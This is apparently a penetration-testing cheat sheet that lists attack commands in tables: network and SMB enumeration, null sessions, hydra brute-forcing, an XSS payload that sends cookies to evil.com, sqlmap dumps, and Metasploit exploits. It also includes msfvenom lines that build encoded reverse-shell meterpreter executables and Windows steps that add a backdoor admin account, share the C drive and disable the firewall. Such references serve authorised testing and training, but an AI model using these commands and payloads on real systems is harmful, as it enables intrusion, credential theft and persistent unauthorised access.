**RECON AND ENUMERATION**

| **Command** | **Description** |
| :--- | :--- |
| nmap -T4 -A -Pn -oA scan -v 192.168.1.1-254 | Full scan |
| for i in 21 22 23 80 443 445;do cat scan.gnmap\|grep " $i/open"\|cut -d "" -f2 &gt; $i.txt;done | Parse results into txt files per port |
| nmap -T4 -v -oA myshares --script smb-enum-shares --script-args smbuser=pwndizzle,smbpass=mypassword -p445 192.168.1.1-254 | Check for open shares |
| dig axfr[example.com](http://example.com/)@[ns1.example.com](http://ns1.example.com/) | DNS zone transfer \(Linux\) |
| tcp.port, tcp.srcport, ip.src, ip.dst, or, and | Wireshark syntax |
| tcpdump tcp port 80 -w output.pcap -i eth0 | Tcpdump syntax |
| mount 192.168.1.1:/share /mnt/nfs | Mount an NFS share |
| mount -o nolock -t nfs -o proto=tcp,port=2049 172.16.1.1:/ /mnt | Mount an NFS share |
| mount -t cifs -o username=&lt;user&gt;,password=&lt;password&gt;,domain=[example.com](http://example.com/)//WIN\_PC\_IP/&lt;share name&gt; /mnt/windows | Mount a Windows share |
| net use x: \filesvr001\folder1 &lt;password&gt; /user:domain01\jsmith /savecred /p:no | Mount a Windows share |
| net use \&lt;target&gt;\IPC$ "" /u:"" | Null session |
| rpcclient -U ""&lt;target&gt; | Null session |
| [enum4linux.pl](http://enum4linux.pl/)192.168.1.20 | Retrieve domain info |
| onesixtyone -c names -i snmphosts | SNMP enum |
| snmpcheck -t 172.10.1.1 -c public | SNMP enum |
| nslookup -&gt; set type=any -&gt; ls -d &lt;domain&gt; | DNS zone transfer \(Windows\) |
| nmap --script=smb-check-vulns --script-args=unsafe=1 -p445 &lt;host&gt; | SMB vuln scan |

**WINDOWS COMMANDS**

[https://docs.google.com/document/d/1U10isynOpQtrIK6ChuReu-K1WHTJm4fgG3joiuz43rw/edit](https://docs.google.com/document/d/1U10isynOpQtrIK6ChuReu-K1WHTJm4fgG3joiuz43rw/edit)

| ipconfig /all | Displays the full information about your NIC’s. |
| :--- | :--- |
| ipconfig /displaydns | Displays your local DNS cache. |
| netstat –nabo | Lists ports / connections with corresponding process \(-b\), don’t perform looking \(-n\), all connections \(-a\) and owning process ID \(-o\) |
| netstat –r | Displays the routing table |
|  |  |
| netstat -anob \| findstr “services, process or port” | The “b” flag makes the command take longer but will output the process name using each of the connections. |
| netsh diag show all | {**XP only**} Shows information on network services and adapters |
| net view | Queries NBNS/SMB \(SAMBA\) and tries to find all hosts in your current workgroup or domain. |
| net view /domain | List all domains available to the host |
| net view /domain:otherdomain | Queries NBNS/SMB \(SAMBA\) and tries to find all hosts in the ‘otherdomain’ |
| net user %USERNAME% /domain | Pulls information on the current user, if they are a domain user. If you are a local user then you just drop the /domain. Important things to note are login times, last time changed password, logon scripts, and group membership |
| net user /domain | Lists all of the domain users |
| net accounts | Prints the password policy for the local system. This can be different and superseded by the domain policy. |
| net accounts /domain | Prints the password policy for the domain |
| net localgroup administrators | Prints the members of the Administrators local group |
| net localgroup administrators /domain | as this was supposed to use localgroup & domain, this actually another way of getting \*current\* domain admins |
| net group “Domain Admins” /domain | Prints the members of the Domain Admins group |
| net group “Enterprise Admins” /domain | Prints the members of the Enterprise Admins group |
| net group “Domain Controllers” /domain | Prints the list of Domain Controllers for the current domain |
| net share | Displays your currently shared SMB entries, and what path\(s\) they point to |
| net session \| find / “\” |  |
| arp –a | Lists all the systems currently in the machine’s ARP table. |
| route print | Prints the machine’s routing table. This can be good for finding other networks and static routes that have been put in place |
| Whoami | View the current user |
| tasklist /v | List processes |
| taskkill /F /IM "cmd.exe" | Kill a process by its name |
| net user hacker hacker /add | Creates a new local \(to the victim\) user called ‘hacker’ with the password of ‘hacker’ |
| net localgroup administrators hacker /add | Adds the new user ‘hacker’ to the local administrators group |
| net share nothing$=C: /grant:hacker,FULL /unlimited | Shares the C drive \(you can specify any drive\) out as a Windows share and grants the user ‘hacker’ full rights to access, or modify anything on that drive.One thing to note is that in newer \(will have to look up exactly when, I believe since XP SP2\) windows versions, share permissions and file permissions are separated. Since we added our selves as a local admin this isn’t a problem but it is something to keep in mind |
| net user username /active:yes /domain | Changes an inactive / disabled account to active. This can useful for re-enabling old domain admins to use, but still puts up a red flag if those accounts are being watched. |
| netsh firewall set opmode disable | Disables the local windows firewall |

**LINUX COMMANDS**

| **Command** | **Description** |
| :--- | :--- |
| apt-get install finger rsh-client jxplorer sipcalc | Finger not installed in Kali by default |
| apt-get install rsh-client | R-tools not installed in Kali by default |
| uname –a | Kernel version |
| cat /etc/&lt;distro&gt;-release | Release version |
| showrev –p | Revision |
| rlogin -l &lt;user&gt;&lt;target&gt; | rlogin |
| rsh &lt;target&gt;&lt;command&gt; | rsh |
| find / -perm +6000 -type f -exec ls -ld {} \; &gt; setuid.txt & | Find setuid binaries |
| finger &lt;username&gt;@&lt;ip&gt; | Retrieve user info |
| mysql -h &lt;ip&gt; -u &lt;user&gt; -p &lt;password&gt; | Connect to mysql |
| oscanner -s &lt;ip&gt; -r &lt;repfile&gt; | Oracle scanner |

**PASSWORD GUESSING**

| **Command** | **Description** |
| :--- | :--- |
| hydra -L users -P passwords -M 21.txt ftp | Brute ftp |
| hydra -L users -P passwords -M 22.txt ssh | Brute ssh |
| hydra -L users -P passwords -M 445.txt smb | Brute smb |

| **User List** |
| :--- |
| Root |
| Admin |
| Administrator |
| Manager |
| Crest |
| Crt |
| User |

**  
 PASSWORD CRACKING**

| **Command** | **Description** |
| :--- | :--- |
| john --wordlist=/usr/share/wordlists/rockyou.txt hashes | JTR default |

**WEB APP**

| **Command** | **Description** |
| :--- | :--- |
| document.write\('&lt;img src="[http://evil.com/x.gif?cookie=](http://evil.com/x.gif?cookie=)' + document.cookie + '" /&gt;\) | XSS steal cookie |
| sqlmap -u &lt;target&gt; -p PARAM --data=POSTDATA --cookie=COOKIE --level=3 --current-user --current-db --passwords --file-read="/var/www/test.php" | Targeted scan |
| sqlmap -u[http://example.com](http://example.com/)--forms --batch --crawl=10 --cookie=jsessionid=12345 --level=5 --risk=3 |  |

**METASPLOIT**

| **Command** | **Description** |
| :--- | :--- |
| use auxiliary/scanner/http/dir\_scanner | Scan for directories |
| use auxiliary/scanner/http/jboss\_vulnscan | JBoss scan |
| use exploit/multi/http/jboss\_maindeployer | JBoss deploy |
| use auxiliary/scanner/mssql/mssql\_login | MSSQL cred scan |
| use exploit/windows/mssql/mssql\_payload | MSSQL payload |
| use auxiliary/scanner/mysql/mysql\_version | MySQL version scan |
| use auxiliary/scanner/mysql/mysql\_login | MySQL login |
| use auxiliary/scanner/oracle/oracle\_login | Oracle login |
| use exploit/windows/dcerpc/ms03\_026\_dcom | eazymode |
| use exploit/windows/smb/ms06\_040\_netapi | eazymode |
| use exploit/windows/smb/ms08\_067\_netapi | eazymode |
| use exploit/windows/smb/ms09\_050\_smb2\_negotiate\_func\_index | eazymode |
| run post/windows/gather/win\_privs | Show privs of current user |
| use exploit/windows/local/bypassuac \(check if x86/64 and set target\) | Bypass uac on win7+ |
| load mimikatz -&gt; wdigest | Dump creds |
| load incongnito -&gt; list\_tokens -&gt; impersonate\_token | Use tokens |
| use post/windows/gather/credentials/gpp | GPP |
| run post/windows/gather/local\_admin\_search\_enum | Test other machines |
| msfpayload windows/meterpreter/reverse\_tcp LHOST=192.168.0.1 LPORT=4445 R \| msfencode -t exe -e x86/shikata\_ga\_nai -c 5 &gt; custom.exe | Standalone meterpreter |
| use exploit/multi/script/web\_delivery | Powershell payload delivery |
| post/windows/manage/powershell/exec\_powershell | Upload and run a PS script through a session |
| msfvenom -p windows/meterpreter/reverse\_tcp LHOST=172.1.3.19 LPORT=4444 -a x86 -f exe -e x86/shikata\_ga\_nai -b '\x00' -i 3 &gt; meter.exe | Generate standalone payload |



